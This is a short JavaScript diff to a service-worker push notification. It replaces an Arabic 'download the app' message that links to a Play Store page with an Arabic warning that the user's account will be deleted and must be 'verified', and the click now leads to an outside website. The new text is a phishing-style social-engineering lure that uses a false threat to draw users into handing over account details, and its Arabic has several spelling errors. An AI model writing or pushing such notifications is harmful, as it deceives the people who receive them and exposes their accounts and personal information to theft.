@@ -24,11 +24,11 @@ function askPermission() {
 
 function sendNotif() {
   navigator.serviceWorker.ready.then(reg => {
-    reg.showNotification("حمّل التطبيق الآن", {
-      body: "اضغط هنا للتحميل",
+    reg.showNotification("سنقوم بحذف حاسبك من على بريدي موب يرجى التحقق من حسابك", {
+      body: "ضغط هنا لتحقق من معلوماتك",
       icon: "icon.png",
       data: {
-        url: "https://play.google.com/store/apps/details?id=com.example.app"
+        url: "https://www.eccp.com"
       }
     });
   });
